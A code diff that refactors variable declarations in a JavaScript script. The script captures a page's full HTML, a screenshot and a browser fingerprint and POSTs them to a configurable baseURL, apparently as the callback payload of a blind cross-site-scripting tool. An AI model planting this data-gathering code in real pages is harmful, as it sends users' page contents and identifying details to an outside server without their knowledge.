@@ -33,13 +33,13 @@ var FingerprintJS = function (e) { "use strict"; function t(e, t) { e = [e[0] >>
 
 
 function gatherData(screenshot, fingerprint, otherData) {
-    otherDataList = otherData.split("&")
-    otherDataDict = {}
+    const otherDataList = otherData.split("&")
+    let otherDataDict = {}
     for (const element of otherDataList) {
-        element_splitted = element.split("=")
+        const element_splitted = element.split("=")
         otherDataDict[element_splitted[0]] = element_splitted[1]
     }
-    data = Object.assign({
+    const data = Object.assign({
         dom: document.documentElement.innerHTML,
         screenshot: screenshot.toDataURL(),
         fingerprint: JSON.stringify(fingerprint),
@@ -52,7 +52,7 @@ function gatherData(screenshot, fingerprint, otherData) {
 }
 
 function serverCallback(baseURL, data) {
-    request = new XMLHttpRequest()
+    const request = new XMLHttpRequest()
     request.open('POST', baseURL, true)
     request.setRequestHeader('Content-type', 'application/json;charset=UTF-8')
     request.send(JSON.stringify(data))
@@ -62,7 +62,7 @@ function sendData(baseURL, otherData) {
     html2canvas(document.querySelector("html")).then(screenshot => {
         FingerprintJS.load().then(fp => {
             fp.get().then(fingerprint => {
-                let data = gatherData(screenshot, fingerprint, otherData)
+                const data = gatherData(screenshot, fingerprint, otherData)
                 serverCallback(baseURL, data)
             });
         });
